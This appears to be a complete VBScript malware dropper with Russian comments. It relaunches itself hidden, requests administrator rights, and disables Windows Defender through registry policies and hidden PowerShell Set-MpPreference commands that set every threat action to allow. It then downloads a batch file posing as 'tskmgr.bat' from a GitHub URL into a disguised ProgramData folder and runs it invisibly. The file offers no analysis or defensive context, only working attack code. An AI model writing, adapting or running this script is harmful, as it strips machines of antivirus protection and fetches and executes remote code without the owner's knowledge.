Option Explicit

' Запускаем скрипт в скрытом режиме
If WScript.Arguments.Count = 0 Then
    CreateObject("WScript.Shell").Run "wscript.exe """ & WScript.ScriptFullName & """", 0, False
    WScript.Quit
End If

' Проверяем, запущен ли скрипт с правами администратора
If Not WScript.Arguments.Named.Exists("elevate") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName, _
        """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
    WScript.Quit
End If

On Error Resume Next
' Настройка реестра для отключения Windows Defender
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", "1", "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", "1", "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable", "1", "REG_DWORD"

WScript.Sleep 100

' Выполнение команд PowerShell для отключения различных функций защиты
outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
outputMessage("Set-MpPreference -DisableIOAVProtection $true")
outputMessage("Set-MpPreference -DisableScriptScanning $true")
outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
outputMessage("Set-MpPreference -MAPSReporting 0")
outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")

' Объявим переменные для загрузки файла
Dim objHTTP, objStream, url, filePath

Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
url = "https://github.com/Rlz-vz/SchoolSigma/raw/main/tskmgr.bat"
filePath = "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\tskmgr.bat"

Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists("C:\temp") Then
    fso.CreateFolder "C:\temp"
End If

On Error Resume Next ' Игнорируем ошибки
objHTTP.Open "GET", url, False
objHTTP.Send

If objHTTP.Status = 200 Then
    ' Успешный ответ, сохраняем файл
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' 1 = binary
    objStream.Open
    objStream.Write objHTTP.responseBody
    objStream.SaveToFile filePath, 2 ' 2 = перезапись
    objStream.Close
    
    ' Запускаем файл невидимо
    CreateObject("WScript.Shell").Run filePath, 0, False ' 0 = скрытый режим
End If

Set objStream = Nothing
Set objHTTP = Nothing
Set fso = Nothing

Sub outputMessage(ByVal args)
    On Error Resume Next
    Set objShell = CreateObject("Wscript.shell")
    objShell.run("powershell " + args), 0
End Sub